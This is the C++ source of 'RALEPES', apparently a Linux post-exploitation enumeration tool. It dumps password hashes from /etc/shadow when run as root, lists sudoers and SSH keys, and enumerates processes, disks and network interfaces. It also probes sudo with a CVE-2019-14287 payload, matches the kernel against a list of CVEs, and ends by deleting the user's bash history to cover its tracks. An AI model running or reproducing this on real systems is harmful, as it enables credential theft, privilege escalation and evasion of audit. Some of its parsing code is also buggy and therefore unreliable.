#include <fstream>
#include <list>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <cstdlib>
#include <filesystem>
#include <cstdio>
#include "rcves.h"
#include <ifaddrs.h>
#include <arpa/inet.h>

#define rversion "v0.2.2"

using namespace std;

string banner = "               /////////               \n"
"            ///////////////            \n"
"           /// ///////// ///           \n"
"       //   ///(///////(///   //       \n"
"      ///    /////////////    ///      \n"
"    &///      #/////////#      ///&    \n"
"   /////        ///////        /////   \n"
"  /////            /            /////  \n"
"///////            /            ///////\n"
"//////             /             //////\n"
" //////            /            ////// \n"
"  /////            /            /////  \n"
"  (////           &/            ////(  \n"
"   /////          / /          /////   \n"
"    ////         (/ /#         ////    \n"
"     ///         /   /         ///     \n"
"      //#                     #//      \n"
"       //                     //       \n"
"        /                     /        \n"
"         &                   &         \n";

list<string> getContents(string dir, int flag)
{
	list<string> files;
    for (auto& p : std::filesystem::directory_iterator(dir))
	{
        if (flag == 1)          // Directories
        {
            if (p.is_directory())
                files.push_back(p.path().string());
        }
        else if (flag == 2)     // Files
        {
            if (p.is_regular_file())
                files.push_back(p.path().string());
        }
	}
	return files;
}

string removeChar(string data, string character)
{
	while (data.find(character) != -1)
	{
		data.erase(data.find(character), 1);
	}
	return data;
}

string removeSysChars(string data)
{
	for (int c = data.size(); c > 0; c--)
	{
		if (!isgraph(data[c]))
			data.erase(c, c+1);
	}
	return data;
}

string trimString(string data, string character)
{
	while (data.find(character+character) != -1)
	{
		data.erase(data.find(character+character), data.find(character+character)+1);
	}
	return data;
}

bool isNumber(string data)
{
	for (int c = 0; c < data.size(); c++)
	{
		if (!isdigit(data[c]))
			return false;
	}
	return true;
}

string getCmdOutput(string cmd)
{
	string data = "";
	FILE * stream;
	const int max_buffer = 256;
	char buffer[max_buffer];
	cmd.append(" 2>&1");
	stream = popen(cmd.c_str(), "r");
	if (stream)
	{
		while (!feof(stream))
		{
			if (fgets(buffer, max_buffer, stream) != NULL)
				data.append(buffer);
		}
		pclose(stream);
	}
	return data;
}

string getSafeCmdOutput(string cmd)
{
	string output = getCmdOutput(cmd);
	if (output.substr(output.rfind(' ')+1, string("directory").size()) != "directory")
		return output;
	else
		return "ERN";
}

void printMsg(string msg, int type)
{
	int color;
	string box;
	if (type == 1)		// Informational
	{
		color = 34;
		box = "*";
	}
	else if (type == 2)	// Good
	{
		color = 32;
		box = "+";
	}
	else if (type == 3)	// Warning
	{
		color = 33;
		box = "!";
	}
	else			// Error
	{

		color = 31;
		box = "-";
	}
	printf("\033[0;%dm[\033[0m%s\033[0;%dm]\033[0m %s\n", color, box.c_str(), color, msg.c_str());
}

list<size_t> findOccurences(string line, char delimeter)
{
	list<size_t> finds;
	size_t find = line.find(delimeter);
	while (find != string::npos)
	{
		finds.push_back(find);
		find = line.find(':', find+1);
	}
	return finds;
}

bool kernelWithinRange(string kernel, string rangestart, string rangeend)
{
    list<string> kernelsold = { rangestart, kernel, rangeend };
    list<string> kernelsnew = { rangestart, kernel, rangeend };
    kernelsnew.sort();
    if (kernelsnew == kernelsold)
        return true;
    else
        return false;
}

int main()
{
	printf("\n");
    	// Print banner
    	printf("\n\n\033[38;5;202m%s\033[0m\n\n\033[38;5;208mRALEPES\033[0m version \033[38;5;208m%s\033[0m\n\n\n", banner.c_str(), rversion);
	// Current Linux user
	string iam = getenv("USER");
	string homedir = "";
	string kernel = "";
	bool root = false;
	printMsg("I am \033[0;1m" + iam + "\033[0m", 1);
	if (iam == "root")
	{
		printMsg("Which means I have system privileges!\n", 2);
		root = true;
	}
	else
	{
		printMsg("Not a root user\n", 3);
	}
	// Linux system info
	struct utsname unameData;
	uname(&unameData);
	printMsg("Linux system information:", 1);
	printf("Operating system: %s\nHostname: %s\nOS release: %s\nVersion release: %s\nArchitecture: %s\n", unameData.sysname, unameData.nodename, unameData.release, unameData.version, unameData.machine);
	kernel = unameData.release;
	if (kernel.find('-') != -1)
		kernel = kernel.substr(0, kernel.find('-'));
	// Linux distribution
	printf("\n");
	printMsg("Getting the distro name..", 1);
	try
	{
		ifstream distro;
		distro.open("/etc/os-release");
		if (distro.is_open())
		{
			bool ifdistro = false;
			string distroname = "";
			string color = "";
			for (string line; getline(distro,line);)
			{
				if (line.substr(0, line.find("=")) == "PRETTY_NAME")
				{
					distroname = line.substr(line.find("=")+1, line.size());
					distroname = removeChar(distroname, "\"");
					ifdistro = true;
				}
				else if (line.substr(0, line.find("=")) == "ANSI_COLOR")
				{
					color = line.substr(line.find("=")+1, line.size());
					color = "\033[" + removeChar(color, "\"") + "m";
				}
			}
			if (!ifdistro)
				printMsg("Could not find the distro name", 3);
			else
				printMsg("Distribution: " + color + distroname + "\033[0", 2);
			distro.close();
		}
		else
			printMsg("Could not get the distro name", 4);
	}
	catch (...)
	{
		printMsg("Could not get the distro name", 4);
	}
	// Linux users
	printf("\n");
	printMsg("Loading the user file..", 1);
	list<string> homedirs;
	list<string> idusers;
	try
	{
		ifstream psswd;
		psswd.open("/etc/passwd");
		if (psswd.is_open())
		{
			for (string line; getline(psswd,line);)
			{
				list<size_t> finds = findOccurences(line, ':');
				string user;
				list<size_t>::iterator it = finds.begin();
				user = line.substr(0, *it);
				advance(it, 2);
				user += line.substr(*it, line.find(':', *it+1)-(*it));
				idusers.push_back(user);
				if (finds.size() == 6)
				{
					it = finds.begin();
					string username = line.substr(0, *it);
					advance(it, 4);
					string home = string(&line[*it+1],&line[line.rfind(':')]);
					string shell = line.substr(line.rfind(':')+1, line.size());
					if (shell != "/usr/bin/nologin") {
						printMsg("User found: " + username + ", home directory: " + home, 2);
						homedirs.push_back(home);
						if (username == iam)
							homedir = home;
					}
				}
			}
			psswd.close();
		}
		else
		{
			printMsg("Failed opening the user file", 4);
		}
	}
	catch (...)
	{
		printMsg("Failed processing the user file", 4);
	}
	// Linux passwords
	if (root)
	{
		printf("\n");
		try
		{
			printMsg("Reading the password file..", 1);
			ifstream shadow;
			shadow.open("/etc/shadow");
			for (string line; getline(shadow,line);)
			{
				list<size_t> finds = findOccurences(line, ':');
				if (finds.size() == 8)
				{
					list<size_t>::iterator it = finds.begin();
					string username = line.substr(0, *it);
					advance(it, 0);
					int beginpos = *it;
					advance(it, 1);
					string password = line.substr(beginpos+1, *it-beginpos-1);
					if (password != "!!")
					{
						printMsg("Password hash for user " + username + " is " + password, 2);
					}
				}
			}
			shadow.close();
		}
		catch (...)
		{
			printMsg("Failed processing the password file", 4);
		}
	}
	// Getting the sudoers
	printf("\n");
	printMsg("Getting the sudoers list..", 1);
	try
	{
		ifstream sudoers;
		sudoers.open("/etc/sudoers");
		if (!sudoers.is_open())
		{
			if (root)
				printMsg("Could not read the sudoers file", 3);
			else
				printMsg("Could not read the sudoers file, try as root", 3);
		}
		else
		{
			for (string line; getline(sudoers,line);)
			{
				if (line.substr(0, 1) != "#" && line.substr(0, 1) != "")
				{
					printMsg("Sudoer found: " + line, 2);
				}
			}
			sudoers.close();
		}
	}
	catch (...)
	{
		printMsg("Could not get the sudoers", 4);
	}
	// Getting the SSH keys
	printf("\n");
	printMsg("Getting the SSH keys..", 1);
	try
	{
		bool sshfound = false;
		list<string>::iterator it;
		for (it = homedirs.begin(); it != homedirs.end(); it++)
		{
			try
			{
				list<string> sshdirs = getContents(*it + "/.ssh", 2);
				list<string>::iterator it2;
				for (it2 = sshdirs.begin(); it2 != sshdirs.end(); it2++)
				{
					string extension = (*it2).substr((*it2).rfind('.')+1, (*it2).size());
					if (extension == "id")
					{
						printMsg("SSH key found at " + *it2, 2);
						sshfound = true;
					}
				}
			}
			catch (...)
			{
				printf("");		// Better replace this later
			}
		}
		if (!sshfound)
			printMsg("No SSH keys found", 3);
	}
	catch (...)
	{
		printMsg("Could not get the SSH keys", 4);
	}
	// Getting storage devices
	printf("\n");
	printMsg("Getting storage devices..", 1);
	try
	{
		list<string> devices = getContents("/sys/block", 1);
		list<string>::iterator it;
		for (it = devices.begin(); it != devices.end(); it++)
		{
			bool attached = false;
			list<string> goodSubdirs;
			list<string> subdirs = getContents(*it, 1);
			string devname = (*it).c_str();
			devname = devname.substr(devname.rfind('/')+1, devname.size());
			list<string>::iterator it2;
			for (it2 = subdirs.begin(); it2 != subdirs.end(); it2++)
			{
				string subdirname = (*it2).c_str();
				subdirname = subdirname.substr(subdirname.rfind('/')+1, subdirname.size());
				if (subdirname.substr(0, devname.size()) == devname)
				{
					attached = true;
					goodSubdirs.push_back("/dev/" + subdirname);
				}
			}
			if (attached)
			{
				goodSubdirs.sort();
				printMsg("Disk " + devname + " found:", 2);
				ifstream mounts;
				mounts.open("/proc/mounts");
				if (mounts.is_open())
				{
					for (string line; getline(mounts,line);)
					{
						for (it2 = goodSubdirs.begin(); it2 != goodSubdirs.end(); it2++)
						{
							//printf("\tpartition %s\n", (*it2).c_str());
							int space = line.find(' ');
							string mount = "";
							if (line.substr(0, space) == *it2)
							{
								mount = line.substr(space+1, line.size());
								mount = mount.substr(0, mount.find(' '));
							}
							if (mount != "")
							{
								printf("\tpartition %s mounted on %s\n", (*it2).c_str(), mount.c_str());
							}
						}
					}
				}
				mounts.close();
			}
		}
	}
	catch (...)
	{
		printMsg("Failed getting available storage devices", 4);
	}
	// List the running processes
	printf("\n");
	printMsg("Getting running processes..", 1);
	try
	{
		list<string> processes = getContents("/proc", 1);
		list<string>::iterator it;
		for (it = processes.begin(); it != processes.end(); it++)
		{
			string procid = (*it).substr((*it).rfind('/')+1, (*it).size());
			string cmdline = "";
			ifstream cmdlinef;
			cmdlinef.open((*it)+"/cmdline");
			if (cmdlinef.is_open())
			{
				getline(cmdlinef, cmdline);
				cmdline = removeSysChars(cmdline.substr(0, cmdline.size()));
				cmdlinef.close();
			}
			string name = "";
			ifstream namef;
			namef.open((*it)+"/comm");
			if (namef.is_open())
			{
				getline(namef, name);
				name = removeSysChars(name);
				namef.close();
			}
			string user = "";
			string luid = "";
			ifstream luidf;
			luidf.open((*it)+"/loginuid");
			if (luidf.is_open())
			{
				string uid = "";
				getline(luidf, luid);
				list<string>::iterator it2;
				bool found = false;
				for (it2 = idusers.begin(); it2 != idusers.end(); it2++)
				{
					string username = (*it2).substr(0, (*it2).find(':'));
					string uid = (*it2).substr((*it2).find(':')+1, (*it2).size());
					if (uid == luid)
					{
						user = username;
						found = true;
					}
				}
				if (!found)
					user = "root";
				luidf.close();
			}
			string state = "";
			ifstream status;
			status.open((*it)+"/status");
			if (status.is_open())
			{
				for (string line; getline(status,line);)
				{
					if (line.substr(0, line.find(':')) == "State")
					{
						state = removeChar(line, "\t");
						state = state.substr(state.find(" ")+1, state.size());
						state = removeChar(removeChar(state, ")"), "(");
					}
				}
				if (isNumber(procid) && cmdline != "")
					printMsg(procid + " " + user + "@[" + name + "]" + " " + state + " (" + cmdline + ")", 2);
				status.close();
			}
		}
	}
	catch (...)
	{
		printMsg("Failed to get running processes", 4);
	}
	// Looking for installed software
	printf("\n");
	printMsg("Looking for installed software..", 1);
	// GCC
	try
	{
		string cmdout = getSafeCmdOutput("/bin/gcc -v");
		if (cmdout != "ERN")
		{
			string versionblock = cmdout.substr(cmdout.find("gcc version"), cmdout.size());
			versionblock = versionblock.substr(4, versionblock.size());
			versionblock = versionblock.substr(versionblock.find(' ')+1, versionblock.size());
			versionblock = versionblock.substr(0, versionblock.find(' '));
			printMsg("GCC version: " + versionblock, 2);
		}
		else
			printMsg("That's funny, we did not find GCC installed", 3);
	}
	catch (...)
	{
		printMsg("Error trying to determine GCC version", 4);
	}
	// Python
	try
	{
		list<string> pythondirs = { "/bin/python", "/bin/python2", "/bin/python3" };
		list<string>::iterator it;
		list<string> pythonversions;
		string cmdout;
		string versionblock;
		for (it = pythondirs.begin(); it != pythondirs.end(); it++)
		{
			cmdout = getSafeCmdOutput((*it)+" --version");
			if (cmdout != "ERN")
			{
				versionblock = cmdout.substr(cmdout.find(' ')+1, cmdout.size());
				versionblock = removeChar(versionblock, "\n");
				pythonversions.push_back(versionblock);
			}
		}
		pythonversions.sort();
		pythonversions.unique();
		if (pythonversions.size() == 0)
			printMsg("Python seems not to be installed", 3);
		else
		{
			for (it = pythonversions.begin(); it != pythonversions.end(); it++)
			{
				printMsg("Python" + (*it).substr(0, 1) + " version: " + *it, 2);
			}
		}
	}
	catch (...)
	{
		printMsg("Error trying to determine Python version", 4);
	}
	// Perl
	try
	{
		string cmdout = getSafeCmdOutput("/bin/perl -v");
		if (cmdout != "ERN")
		{
			string versionblock = cmdout.substr(cmdout.find('(')+1, cmdout.size());
			versionblock = versionblock.substr(0, versionblock.find(')'));
			printMsg("Perl version: " + versionblock, 2);
		}
		else
			printMsg("Perl seems not to be installed", 3);
	}
	catch (...)
	{
		printMsg("Error trying to determine Perl version", 4);
	}
	// Ruby
	try
	{
		string cmdout = getSafeCmdOutput("/bin/ruby -v");
		if (cmdout != "ERN")
		{
			string versionblock = cmdout.substr(cmdout.find(' ')+1, cmdout.size());
			versionblock = versionblock.substr(0, versionblock.find(' '));
			printMsg("Ruby version: " + versionblock, 2);
		}
		else
			printMsg("Ruby seems not to be installed", 3);
	}
	catch (...)
	{
		printMsg("Error trying to determine Ruby version", 4);
	}
    // Get network information
	printf("\n");
	printMsg("Getting network information..", 1);
	try
	{
		struct ifaddrs *ifap, *ifa;
		struct sockaddr_in *sa;
		char *addr;
		getifaddrs(&ifap);
		for (ifa = ifap; ifa; ifa = ifa->ifa_next)
		{
			if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET)
			{
				sa = (struct sockaddr_in *) ifa->ifa_addr;
				addr = inet_ntoa(sa->sin_addr);
				printMsg("Interface " + string(ifa->ifa_name) + " has IP " + string(addr), 2);
			}
		}
	}
	catch (...)
	{
		printMsg("Could not get the network information", 4);
	}
	// Testing for CVE-2019-14287
	printf("\n");
	printMsg("Testing for CVE-2019-14287..", 1);
	try
	{
		string cmdout = getCmdOutput("sudo -u#-1 whoami");
		if (cmdout == "")
			printMsg("Could open sudo, is it installed?", 3);
		else if (cmdout.substr(0, 4) == "root")
			printMsg("[sudo vulnerability] System is vulnerable to CVE-2019-14287", 2);
		else
			printMsg("System not vulnerable", 3);
	}
	catch (...)
	{
		printMsg("Could not perform the test", 4);
	}
	// Checking against the CVEs
	printf("\n");
    printMsg("Testing against CVEs we have..", 1);
    printMsg("CVE entries in the database: " + to_string(cves.size()), 2);
    bool cveed = false;
    list<string>::iterator it;
    for (it = cves.begin(); it != cves.end(); it++)
    {
            string cvename = (*it).substr(0, (*it).find(':'));
            string cvestart = (*it).substr(cvename.size()+1, (*it).size());
            cvestart = cvestart.substr(0, cvestart.rfind(':'));
            string cveend = (*it).substr((*it).rfind(':')+1, (*it).size());
            // todo 'unk' entries
            if (isNumber(kernel.substr(0, 1)) && isNumber(cvestart.substr(0, 1)) && isNumber(cveend.substr(0, 1)))
	    {
                if (kernelWithinRange(kernel, cvestart, cveend))
                {
                    printf("\033[0;31m!!!!!\033[0m\033[0;1m\033[0;91m VULNERABLE \033[0m\033[0;31m!!!!!\033[0m \033[0;34m%s\033[0m\n", cvename.c_str());
                    cveed = true;
                }
	    }
	    else if (cvestart.substr(0, 3) == "unk" && cveend.substr(0, 3) != "unk")
	    {
		if (kernelWithinRange(kernel, cveend, cveend))
		{
            printf("\033[0;31m!!!!!\033[0m\033[0;1m\033[0;91m VULNERABLE \033[0m\033[0;31m!!!!!\033[0m \033[0;34m%s\033[0m\n", cvename.c_str());
			cveed = true;
		}
	    }
	    else if (cveend.substr(0, 3) == "unk" && cvestart.substr(0, 3) != "unk")
	    {
	    	if (kernelWithinRange(kernel, cvestart, cvestart))
		{
            printf("\033[0;31m!!!!!\033[0m\033[0;1m\033[0;91m VULNERABLE \033[0m\033[0;31m!!!!!\033[0m \033[0;34m%s\033[0m\n", cvename.c_str());
			cveed = true;
		}
	    }
    }
    if (!cveed)
        printMsg("No potential vulnerabilities found", 4);
	// Clearing the logs
	printf("\n");
	printMsg("Clearing the logs..", 1);
	try
	{
		if (remove((homedir + "/.bash_history").c_str()) != 0)
			printMsg("Could not remove the bash log file, please check manually", 3);
		else
			printMsg("Deleted the bash log file", 2);
	}
	catch (...)
	{
		printMsg("Failed clearing the bash log file", 4);
	}
	return 0;
}
